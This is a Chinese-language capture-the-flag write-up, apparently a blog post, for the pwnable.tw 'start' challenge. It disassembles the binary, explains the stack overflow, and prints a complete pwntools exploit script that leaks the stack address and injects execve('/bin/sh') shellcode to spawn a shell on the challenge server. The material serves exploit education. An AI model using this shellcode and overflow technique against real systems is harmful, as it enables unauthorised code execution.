    pwnable.tw-start

    PWN题 汇编 shellcode
    Created At : 2020-07-09 00:08
    Count:1.1k Views 👀 :

    保护机制：

    Arch: i386-32-little
    RELRO: No RELRO
    Stack: No canary found
    NX: NX disabled
    PIE: No PIE (0x8048000)

    分析程序：

    通篇只有start函数和exit函数，而且都是以汇编的形式。
    主程序如下：

    .text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn

    下面来详细分析：
    首先060（简写，即0x08048060，下同）处push esp，将当前esp的地址压入栈。
    然后061处把exit函数的返回地址压入栈中。
    066-06c清空寄存器。因为寄存器等会要拿来传参。
    然后06e-082处push一堆字符串入栈（总共0x14字节）。字符串转为ascall码是“Let’s start the CTF:”
    087-08f这段：eax为4表明系统调用号为4号即write函数。把寄存器ecx指向之前push进栈的字符串，所以很明显是要打印刚刚的字符串咯。等一切参数设置好以后，int 80h 来system_call系统调用。
    091-097这一段：xor清空ebx，令eax=3即read函数，edx=0x3c，表明要往栈中read读取 0x3c （60）个字节。
    接下来099处的 add esp,14h 表明回收栈帧，清理栈空间。
    09c是retn返回地址。

    漏洞利用分析：

    首先程序把esp地址存入了栈中，这就是在提示我们可以去泄露它。并且本题没有开启ASLR和PIE。可以泄露。

    其次是write这里，write既然提供打印功能，那我们也就要认识到，可不可以稍微做一点修改，能让write打印出上面的esp的地址呢。

    再然后就是read函数这里很明显存在着溢出点。栈大小估计是只有0x14大小，而现在可以读取0x3c字节，妥妥溢出。

    利用思路：

    当程序段末尾回收掉 0x14 字节栈帧后，最高地址就是exit函数的地址（返回地址），我们可以把返回地址覆盖为 0x8048087（mov ecx,esp 指令，位于write系统调用程序片段首部），于是retn时便可将控制流劫持到mov ecx,esp后，并且栈中esp的地址自动+4，此时栈顶esp存放的正好是本程序第一个语句push 进来的esp的地址。程序流被修改了，故下一条语句是mov ecx,esp，即将write的参数ecx的值指向栈顶。于是借用write系统调用，我们便能把一开始push入栈的esp的地址给泄露出来了。

    由于程序流被劫持，重新来到了write函数片段处执行，而代码顺序从上到下执行，所以又要调用read，我们又有一次输入的机会。

    这一次我们布置shellcode，利用泄露出来的栈地址，我们知道了栈地址，便可把shellcode布置到栈上，然后劫持程序流跳到shellcode并执行。
    所以我们可以直接在第二次read系统调用中溢出将shellcode部分写在esp+0x14的栈内存中，并用这个地址覆盖返回地址，因为第二次还会有add esp，14h这条指令，所以实际覆盖点还要调高0x14个字节。
    所以最终我们覆盖返回地址为 esp+0x14。然后返回地址之后跟上我们的shellcode，随后便会跳转到我们的shellcode处并执行

    exp:

    #!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import  *
io = remote('chall.pwnable.tw',10000)
# io =process('./start')
#shellcode
shellcode="\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"
log.success('len(shellcode) = ' + hex(len(shellcode)))

#leak esp
payload = 'a'*0x14 + p32(0x08048087)  # 硬编码覆盖返回地址为 mov ecx, esp 指令所在地址
# retn to write
# write打印的参数是ecx，而ecx=esp地址。
io.recv()
io.send(payload)

esp=u32(io.recv()[:4])
log.success('esp = ' + hex(esp))
stack = esp + 0x14  
log.success('target addr = ' + hex(stack))  

#get shell
payload = 'a'*0x14 + p32(stack) + shellcode
io.send(payload)

io.interactive()

    总结：

    本题要求能看懂汇编代码。并且要搞清楚esp的运作。
